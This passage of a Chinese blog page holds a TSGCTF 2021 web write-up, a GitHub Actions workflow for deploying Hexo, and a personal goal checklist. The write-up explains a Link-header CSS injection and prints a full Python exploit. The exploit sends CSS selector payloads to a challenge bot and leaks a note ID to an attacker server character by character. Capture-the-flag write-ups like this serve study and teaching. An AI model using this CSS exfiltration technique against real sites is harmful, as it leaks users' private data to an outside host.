class="string">&quot;k&quot;</span>)</span><br><span class="line">		v := c.Query(<span class="string">&quot;v&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> matched, err := regexp.MatchString(<span class="string">&quot;^[a-zA-Z-]+$&quot;</span>, k); matched &amp;&amp; err == <span class="literal">nil</span> &amp;&amp; v != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			c.Header(k, v)</span><br><span class="line">		&#125;</span><br><span class="line">		c.Next()</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.Use(<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		uid, err := c.Cookie(<span class="string">&quot;uid&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> || uid == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			uid, err = randomString(<span class="number">32</span>)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="built_in">panic</span>(err.Error())</span><br><span class="line">			&#125;</span><br><span class="line">			c.SetCookie(<span class="string">&quot;uid&quot;</span>, uid, <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		c.Set(<span class="string">&quot;uid&quot;</span>, uid)</span><br><span class="line">		c.Next()</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// routes</span></span><br><span class="line">	<span class="comment">/////</span></span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		uid, _ := c.Get(<span class="string">&quot;uid&quot;</span>)</span><br><span class="line"></span><br><span class="line">		posts := []Post&#123;&#125;</span><br><span class="line">		db.Where(<span class="string">&quot;uid = ?&quot;</span>, uid.(<span class="keyword">string</span>)).Find(&amp;posts)</span><br><span class="line"></span><br><span class="line">		c.HTML(http.StatusOK, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;posts&quot;</span>: posts,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/reset&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.POST(<span class="string">&quot;/notes&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		uid, _ := c.Get(<span class="string">&quot;uid&quot;</span>)</span><br><span class="line">		title := c.PostForm(<span class="string">&quot;title&quot;</span>)</span><br><span class="line">		description := c.PostForm(<span class="string">&quot;description&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> title == <span class="string">&quot;&quot;</span> || description == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			c.AbortWithStatus(<span class="number">400</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		p := Post&#123;</span><br><span class="line">			UID:         uid.(<span class="keyword">string</span>),</span><br><span class="line">			Title:       title,</span><br><span class="line">			Description: description,</span><br><span class="line">		&#125;</span><br><span class="line">		db.Create(&amp;p)</span><br><span class="line">		c.Redirect(http.StatusFound, <span class="string">&quot;/notes/&quot;</span>+p.ID)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/notes/:id&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		<span class="keyword">var</span> post Post</span><br><span class="line">		<span class="keyword">if</span> db.First(&amp;post, <span class="string">&quot;id = ?&quot;</span>, c.Param(<span class="string">&quot;id&quot;</span>)).Error != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.AbortWithStatus(<span class="number">404</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		c.HTML(http.StatusOK, <span class="string">&quot;detail.html&quot;</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;post&quot;</span>: post,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.POST(<span class="string">&quot;/tell&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err := rdb.RPush(context.Background(), <span class="string">&quot;query&quot;</span>, c.PostForm(<span class="string">&quot;path&quot;</span>)).Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.AbortWithStatus(<span class="number">500</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>实现了以下功能：</p>
<ol>
<li>添加中间件，无cookie会自动生成</li>
<li>会根据k,v来设置http头</li>
<li>运行代码的时候会初始化flag到某一篇文章</li>
<li>写日记，查看日记（只要有日记id就行），自己的日记列表，让管理员访问该网站下的某个网页</li>
</ol>
<p>漏洞点很简单：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">k := c.Query(<span class="string">&quot;k&quot;</span>)</span><br><span class="line">v := c.Query(<span class="string">&quot;v&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> matched, err := regexp.MatchString(<span class="string">&quot;^[a-zA-Z-]+$&quot;</span>, k); matched &amp;&amp; err == <span class="literal">nil</span> &amp;&amp; v != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">	c.Header(k, v)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>刚好之前看到过一篇有意思的文章，了解到了通过http头(link)来设置css脚本，原本也想拿去出一题css-leak的但是直接出的话太简单了</p>
<p>这个题就比较有意思了</p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Link">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Link</a></p>
<p>通过设置Link头来插入css脚本</p>
<p><code>Link: &lt;url here&gt;; rel=&quot;stylesheet&quot;; type=&quot;text/css&quot; </code></p>
<p>但是有个问题题目有csp</p>
<p><code>script-src &#39;self&#39;; style-src &#39;self&#39;; base-uri &#39;none&#39;</code></p>
<p>在旧版的ff中这个csp对link头并没有生效</p>
<p>但是题目用的是最新版的ff</p>
<p>于是需要用报错或者note来作为payload的负载</p>
<p>找报错找了半天没找到</p>
<p>比赛的时候note我只是简单试了以下（连note里双引号会被转义都没发现，错过了一个flag</p>
<p>但是就算note部分可控，好像在解析到我们的payload之前可能就会被浏览器因为语法错误而停止解析，</p>
<p>赛后了解到，通过这样的payload让note能够正常解析</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RANDOM <span class="attribute">CONTENT</span></span><br><span class="line">&#123;&#125; * &#123;<span class="attribute">color</span>:red;&#125;</span><br><span class="line">RANDOM <span class="attribute">CONTENT</span></span><br></pre></td></tr></table></figure>

<p>个人觉得这是因为加上了{}让浏览器以为是selector从而继续解析？</p>
<p>在chrome上也是可以这样的，如果有人知道原因恳请告诉我呜呜呜</p>
<p>直接贴上wp的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">TARGET_BASE = <span class="string">&quot;http://localhost:8888&quot;</span></span><br><span class="line"></span><br><span class="line">LEAK_LENGTH = <span class="number">10</span></span><br><span class="line">CHAR_CANDIDATES = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line">EXPLOIT_BASE_ADDR = <span class="string">&quot;http://host.docker.internal:1337&quot;</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_payload</span>(<span class="params">prefix: <span class="built_in">str</span>, candidates: <span class="string">&quot;List[str]&quot;</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> EXPLOIT_BASE_ADDR</span><br><span class="line">    <span class="keyword">assert</span> EXPLOIT_BASE_ADDR != <span class="string">&quot;&quot;</span>, <span class="string">&quot;EXPLOIT_BASE_ADDR is not set&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> candidate <span class="keyword">in</span> candidates:</span><br><span class="line">        id_prefix_to_try = prefix + candidate</span><br><span class="line">        matcher = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="string">&#x27;\\&#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(x))</span><br><span class="line">                              [<span class="number">2</span>:], <span class="string">&#x27;/notes/&#x27;</span> + id_prefix_to_try))</span><br><span class="line">        payload += <span class="string">&quot;a[href^=&quot;</span> + matcher + <span class="string">&quot;] &#123; background-image: url(&quot;</span> + EXPLOIT_BASE_ADDR + <span class="string">&quot;/leak?q=&quot;</span> + urllib.parse.quote(id_prefix_to_try) + <span class="string">&quot;); &#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post_note</span>(<span class="params">title: <span class="built_in">str</span>, description: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    r = s.post(TARGET_BASE + <span class="string">&quot;/notes&quot;</span>, data=&#123;</span><br><span class="line">        <span class="string">&quot;title&quot;</span>: title,</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: description,</span><br><span class="line">    &#125;, headers=&#123;</span><br><span class="line">        <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">assert</span> r.status_code == <span class="number">302</span>, <span class="string">&quot;invalid status code: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        r.status_code)</span><br><span class="line">    <span class="keyword">return</span> r.headers[<span class="string">&#x27;Location&#x27;</span>].split(<span class="string">&#x27;/notes/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">report_note_as_stylesheet</span>(<span class="params"><span class="built_in">id</span>: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">    header_value = <span class="string">&#x27;&lt;/notes/&#123;&#125;&gt;; rel=&quot;stylesheet&quot;; type=&quot;text/css&quot;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>)</span><br><span class="line">    r = s.post(TARGET_BASE + <span class="string">&quot;/tell&quot;</span>, data=&#123;</span><br><span class="line">        <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/?k=Link&amp;v=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(urllib.parse.quote(header_value)),</span><br><span class="line">    &#125;, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">assert</span> r.status_code == <span class="number">302</span>, <span class="string">&quot;invalid status code: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        r.status_code)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/start&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>():</span></span><br><span class="line">    p = build_payload(<span class="string">&quot;&quot;</span>, CHAR_CANDIDATES)</span><br><span class="line">    exploit_id = post_note(<span class="string">&quot;exploit&quot;</span>, p)</span><br><span class="line">    report_note_as_stylesheet(exploit_id)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[info]: started exploit with a new note: &#123;&#125;/notes/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(TARGET_BASE, exploit_id))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/leak&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>():</span></span><br><span class="line">    leaked_id = request.args.get(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(leaked_id) == LEAK_LENGTH:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] leaked (full ID): &#123;&#125;&quot;</span>.<span class="built_in">format</span>(leaked_id))</span><br><span class="line">        r = s.get(TARGET_BASE + <span class="string">&quot;/notes/&quot;</span> + leaked_id)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[info] leaked: &#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            leaked_id, <span class="string">&quot;*&quot;</span> * (LEAK_LENGTH - <span class="built_in">len</span>(leaked_id))))</span><br><span class="line"></span><br><span class="line">        p = build_payload(leaked_id, CHAR_CANDIDATES)</span><br><span class="line">        exploit_id = post_note(<span class="string">&quot;exploit&quot;</span>, p)</span><br><span class="line">        report_note_as_stylesheet(exploit_id)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[info]: invoked crawler with a new note: &quot;</span> + exploit_id)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[info] running app ...&quot;</span>)</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure>



<h2 id="Giita"><a href="#Giita" class="headerlink" title="Giita"></a>Giita</h2><p>没怎么看</p>
<p>贴上官方wp</p>
<p><a target="_blank" rel="noopener" href="https://hackmd.io/@hakatashi/HkgG02U4t">https://hackmd.io/@hakatashi/HkgG02U4t</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2021/10/03/TSGCTF2021/" data-id="ckw7zwbzu002dfmol9ek379i0" data-title="TSGCTF 2021" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-用github action 让hexo体验++" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/%E7%94%A8github%20action%20%E8%AE%A9hexo%E4%BD%93%E9%AA%8C++/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T16:00:00.000Z" itemprop="datePublished">2021-10-02</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/%E7%94%A8github%20action%20%E8%AE%A9hexo%E4%BD%93%E9%AA%8C++/">用github action 让hexo体验++</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="用github-action-让hexo体验"><a href="#用github-action-让hexo体验" class="headerlink" title="用github action 让hexo体验++"></a>用github action 让hexo体验++</h1><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>因为电脑机械硬盘不知道啥原因，有时候磁盘上某个文件的数据就坏掉了</p>
<p>然后 node_modules 或者某篇文章就GG了，虽然现在把那个机械换掉了</p>
<p>但是每次都要<code>hexo deploy</code>好麻烦啊</p>
<p>于是打算搞个 github action 自动生成静态文件，我只要关注 source 还有 config 就好了</p>
<h2 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h2><p>我们需要把 配置，文章，hexo生成的静态文件隔离开来，显然直接把它们放在不同的分支就好了</p>
<p>新建三个分支：master(存放文章)，config(存放配置，敏感配置放到secret中)，website(存放生成的网站)</p>
<p>github action 的逻辑：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">安装 hexo 环境</span><br><span class="line"></span><br><span class="line">克隆文章分支，克隆配置分支，克隆主题</span><br><span class="line"></span><br><span class="line">配置文件字符串替换(如果有敏感数据的话)</span><br><span class="line"></span><br><span class="line">生成静态文件</span><br><span class="line"></span><br><span class="line">submit</span><br></pre></td></tr></table></figure>

<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">workflow_dispatch:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">config</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义环境变量</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build-and-deploy:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">ref:</span> <span class="string">config</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">ref:</span> <span class="string">master</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">source</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">ref:</span> <span class="string">website</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">public</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&#x27;14&#x27;</span></span><br><span class="line">          <span class="attr">cache:</span> <span class="string">&#x27;npm&#x27;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">npm</span> <span class="string">install</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="comment"># 生成并部署</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          npx hexo generate</span></span><br><span class="line"><span class="string">          cd public </span></span><br><span class="line"><span class="string">          git config --global user.name &#x27;ccreater222&#x27;</span></span><br><span class="line"><span class="string">          git config --global user.email &#x27;ccreater222@users.noreply.github.com&#x27;</span></span><br><span class="line"><span class="string">          git add *</span></span><br><span class="line"><span class="string">          git commit -am &quot;Automated generation&quot;</span></span><br><span class="line"><span class="string">          git push origin website</span></span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2021/10/01/%E7%94%A8github%20action%20%E8%AE%A9hexo%E4%BD%93%E9%AA%8C++/" data-id="ckw7zwc1r0087fmolhjwcfsd2" data-title="用github action 让hexo体验++" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-我的2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/03/01/%E6%88%91%E7%9A%842020/" class="article-date">
  <time class="dt-published" datetime="2021-03-01T16:00:00.000Z" itemprop="datePublished">2021-03-02</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/03/01/%E6%88%91%E7%9A%842020/">我的2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="我的2020"><a href="#我的2020" class="headerlink" title="我的2020"></a>我的2020</h1><h2 id="这个是啥"><a href="#这个是啥" class="headerlink" title="这个是啥"></a>这个是啥</h2><p>这是一个目标清单,来记录我2020年想要完成的事情.</p>
<h2 id="写这个的原因"><a href="#写这个的原因" class="headerlink" title="写这个的原因"></a>写这个的原因</h2><p><strong>我想要在大学毕业后,很自然的认为:我的大学是充实的,是我每一天认认真真的走过去的.我可以自豪的承认自己的优秀</strong></p>
<p><img src="https://i.loli.net/2020/01/31/7OHm9wbEsVYgfd3.png" alt="image173"></p>
<p>我想要变得更加优秀,我想活出自己</p>
<h2 id="如何更新-更新规则"><a href="#如何更新-更新规则" class="headerlink" title="如何更新/更新规则"></a>如何更新/更新规则</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li>目标是清晰明确的,量化的</li>
<li>目标难度要适合,不能太简单也不能不可实现</li>
<li>如果无法确定今年的目标,那就确定这个月的吧</li>
<li>根据实际情况对目标进行调整</li>
<li>从自己所能想到的最远的地方(目标/梦想/想法)开始制定目标</li>
</ol>
<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><ol>
<li>举例:我要好好学习(x); 我要学习编程方面的知识,达到能够独立编写自己的博客系统(√)</li>
<li>太简单的目标有必要制定吗,无法实现的目标有必要写下来吗.难度适合的目标可以给予自己一种正反馈,使自己更有信心实现目标,并能从中获取乐趣</li>
<li> 行动是有目的的，而从高到低，从整体到局部，会让你清晰的认识到你现在要怎么做，为什么要这么做，你未来的路在何方会更加清晰，如果某个地方你想不出来，那就缩小范围，你无法考虑你人生的目的，但你可以思考未来10年的方向，可能未来十年也太难下定论，未来一年，一个月，一星期却是可以的。 </li>
<li>因为周围的变化,对目标的不了解等等因素导致可能会制定过难/过易/没有意义的目标,所以要根据实际情况进行调整(不是叫我偷懒哦)</li>
<li>小目标永远是为大目标/梦想/想法服务的</li>
</ol>
<h2 id="将目标转为计划的规则"><a href="#将目标转为计划的规则" class="headerlink" title="将目标转为计划的规则"></a>将目标转为计划的规则</h2><ol>
<li>分解细致，能力可达，留有余地</li>
<li>奖惩并行</li>
<li>每个星期总结一次,计划是否合理</li>
</ol>
<h2 id="所能想到的最远的目标-想法-梦想"><a href="#所能想到的最远的目标-想法-梦想" class="headerlink" title="所能想到的最远的目标/想法/梦想"></a>所能想到的最远的目标/想法/梦想</h2><ol>
<li>在自己热爱的事业上获得可观的收入,成为优秀的白帽子</li>
<li>身体健康,三观尚在 </li>
<li>开发一个类似hexo的python程序</li>
<li>进入补天前1000名（✔）</li>
</ol>
<h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><h3 id="奖惩规则"><a href="#奖惩规则" class="headerlink" title="奖惩规则"></a>奖惩规则</h3><p>时间分为三种:专注时间,自由时间,杂;不得不干且并非在计划中且没有干其他不是不得不干的事情的时间称为:杂</p>
<ol>
<li>每专注于目标2个小时就可以任意支配1个小时的时间</li>
<li>专注过程中跑去玩,从头来过,计时清零</li>
<li>没有认真执行,销毁这份计划</li>
</ol>
<h3 id="寒假"><a href="#寒假" class="headerlink" title="寒假"></a>寒假</h3><p>寒假期间延迟到2.22(不改我完成不了拉)</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 寒假期间补天挖洞获得18个库币(买这个 <a target="_blank" rel="noopener" href="https://www.butian.net/Shop/detail/?id=700399">https://www.butian.net/Shop/detail/?id=700399</a> )</li>
<li><input disabled="" type="checkbox"> 寒假期间复现30个cve(13/30)  , 失败,后面就开始放纵自己呢</li>
<li><input disabled="" type="checkbox"> 寒假期间代码审计一个小cms,找出尽可能多的漏洞 ,失败</li>
<li><input checked="" disabled="" type="checkbox"> 寒假看完码农翻身(3/3)</li>
</ul>
<h3 id="3月份"><a href="#3月份" class="headerlink" title="3月份"></a>3月份</h3><p>3.11-3.31</p>
<ul>
<li><input disabled="" type="checkbox"> 复现20个cve(0/20)</li>
<li><input disabled="" type="checkbox"> 看完一本书(未定)</li>
<li><input checked="" disabled="" type="checkbox"> 看完那本linux书籍</li>
<li><input disabled="" type="checkbox"> buuoj40题(8/40)</li>
<li><input disabled="" type="checkbox"> 再挖出20个库币</li>
</ul>
<h3 id="4月份"><a href="#4月份" class="headerlink" title="4月份"></a>4月份</h3><ul>
<li><input disabled="" type="checkbox"> 复现30个cve(5/30)</li>
<li><input checked="" disabled="" type="checkbox"> 看完一本书(明朝那些事)</li>
